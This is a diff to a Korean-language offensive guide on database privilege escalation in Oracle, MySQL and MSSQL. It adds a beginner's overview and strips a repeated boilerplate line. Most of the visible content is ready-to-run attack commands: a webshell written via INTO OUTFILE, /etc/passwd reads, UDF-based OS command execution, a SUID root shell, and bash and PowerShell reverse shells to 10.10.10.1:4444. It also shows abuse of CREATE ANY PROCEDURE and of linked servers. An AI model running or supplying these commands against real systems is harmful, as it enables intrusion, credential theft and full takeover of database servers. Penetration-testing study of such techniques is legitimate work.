@@ -6,6 +6,75 @@
 
 # DB 권한 상승 — 저권한 계정에서 DBA/OS까지
 
+## 0. 초보자를 위한 개념 이해
+
+### DB 권한 상승이란?
+
+**DB 권한 상승**은 제한된 DB 사용자 계정에서 더 높은 권한을 획득하는 과정입니다.
+
+```
+일반 DB 사용자 권한:
+  SELECT, INSERT, UPDATE (특정 테이블만)
+  자신이 생성한 객체만 수정
+  → 공격자가 접근 가능한 데이터 제한
+
+DBA(Database Administrator) 권한:
+  모든 테이블 접근
+  사용자 계정 생성/삭제
+  감사 로그 접근
+  → 공격자가 전체 DB 장악
+
+OS 수준 권한 (DB를 통해):
+  파일 읽기/쓰기 (DB가 실행 중인 OS)
+  OS 명령 실행
+  → 공격자가 DB 서버 자체를 장악
+```
+
+### 각 DB의 "위험한 기능들"
+
+```
+MySQL/MariaDB:
+  SELECT ... INTO OUTFILE '/var/www/html/shell.php'
+  → 웹 루트에 PHP 파일 쓰기 = 웹쉘 업로드!
+  
+  LOAD_FILE('/etc/passwd')
+  → 서버의 파일 읽기
+  
+  CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'
+  → UDF(사용자 정의 함수)로 OS 명령 실행
+  
+Oracle:
+  DBMS_SCHEDULER.CREATE_JOB → OS 명령 예약 실행
+  UTL_FILE → 파일 읽기/쓰기
+  JAVA_LANG.RUNTIME.EXEC → Java로 OS 명령 실행
+  
+MSSQL:
+  xp_cmdshell 'whoami' → OS 명령 직접 실행 (기본 비활성)
+  OPENROWSET → 원격 파일/서버 접근
+```
+
+### DB 권한 체계 이해
+
+```
+Oracle DB 권한 체계:
+  Privilege (권한)     : CREATE SESSION, SELECT ANY TABLE 등 개별 권한
+  Role (역할)          : CONNECT, DBA 등 권한 묶음
+  Granted Role        : 계정에 부여된 역할
+  
+  DBA 역할 = 거의 모든 권한 (Oracle의 최고 권한)
+
+MySQL 권한 체계:
+  Global Privileges   : 모든 DB에 적용
+  Database Privileges : 특정 DB에 적용
+  Table Privileges    : 특정 테이블에 적용
+  Column Privileges   : 특정 컬럼에 적용
+  
+  root@localhost = 최고 권한 (MySQL의 슈퍼유저)
+  FILE 권한 = 파일 읽기/쓰기 가능 (중요!)
+```
+
+---
+
 ## 1. 권한 상승 경로
 
 ```
@@ -25,9 +94,26 @@ root / SYSTEM
 
 ## 2. Oracle 권한 상승
 
-### 2-1. 현재 권한 및 역할 확인
+### Oracle DB 권한 상승 기법 개요
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+Oracle에서 권한 상승은 주로 다음 방법으로 이루어집니다:
+
+```
+1. 과도 부여된 시스템 권한 악용
+   CREATE ANY PROCEDURE → 모든 사용자의 프로시저 덮어쓰기
+   EXECUTE ANY PROCEDURE → SYS 소유 프로시저 실행
+   
+2. 취약한 PL/SQL 패키지/프로시저
+   AUTHID CURRENT_USER vs AUTHID DEFINER 차이 악용
+   
+3. 내장 패키지 취약점 (CVE)
+   DBMS_XMLQUERY, UTL_FILE, DBMS_SCHEDULER
+   
+4. 동적 SQL 인젝션
+   EXECUTE IMMEDIATE에 사용자 입력 포함
+```
+
+### 2-1. 현재 권한 및 역할 확인
 
 ```sql
 -- 현재 사용자
@@ -50,7 +136,6 @@ AND OWNER != USER;
 
 ### 2-2. CREATE ANY PROCEDURE 악용
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- CREATE ANY PROCEDURE 권한이 있으면 SYS 소유 프로시저 덮어쓰기 가능
@@ -69,7 +154,6 @@ END;
 
 ### 2-3. DBMS_XMLQUERY / DBMS_METADATA 인젝션
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- DBMS_XMLQUERY를 통한 권한 상승 (CVE-2010-3600 등)
@@ -82,7 +166,6 @@ WHERE COMP_NAME LIKE '%XML%';
 
 ### 2-4. 저장 프로시저 내 SQLi (Second-Order)
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 프로시저 내부에 동적 SQL이 있을 경우
@@ -106,7 +189,6 @@ EXEC get_user_data(q'[' UNION SELECT 1,user,3 FROM dual--]');
 
 ### 3-1. 현재 권한 확인
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 현재 사용자 권한
@@ -119,7 +201,6 @@ FROM mysql.user WHERE user = CURRENT_USER();
 
 ### 3-2. MySQL 취약한 설정 악용
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 1. FILE 권한 → 웹쉘 / 설정 파일 읽기
@@ -139,7 +220,6 @@ DO CALL sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
 
 ### 3-3. MySQL 8.x 계정 조작
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 플러그인 우회 (caching_sha2_password → mysql_native_password)
@@ -166,7 +246,6 @@ gcc -shared -fPIC raptor_udf2.c -o raptor_udf2.so
 mysql -u root -p
 ```
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 USE mysql;
@@ -184,7 +263,6 @@ SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
 
 ### 4-1. xp_cmdshell 활성화 및 명령 실행
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- xp_cmdshell 활성화 (sysadmin 필요)
@@ -204,7 +282,6 @@ EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\"10.1
 
 ### 4-2. Linked Server 악용
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 링크드 서버 목록
@@ -219,7 +296,6 @@ EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];
 
 ### 4-3. Impersonation (사용자 가장)
 
-SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 가장할 수 있는 사용자 확인
